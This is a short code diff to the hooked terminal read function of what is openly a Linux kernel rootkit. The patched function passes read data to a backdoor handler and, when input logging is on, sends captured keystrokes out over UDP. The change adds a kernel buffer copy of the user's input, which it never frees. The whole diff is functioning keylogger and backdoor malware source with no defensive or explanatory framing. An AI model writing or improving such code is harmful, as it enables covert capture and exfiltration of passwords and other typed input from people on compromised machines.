@@ -152,11 +152,14 @@ g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
     atomic_inc(&tty_read_count);
     ssize_t ret = sys_tty_read(file, buf, count, off);
 
+    char *buf_new = (char *)kmalloc(count, GFP_KERNEL);
+    copy_from_user(buf_new, buf, count);
+
     if (rootkit.backdoor == BD_TTY)
         handle_pid(current->pid, buf, count);
 
     if (rootkit.logging_input)
-        send_udp(buf, count);
+        send_udp(buf_new, count);
 
     atomic_dec(&tty_read_count);
     return ret;
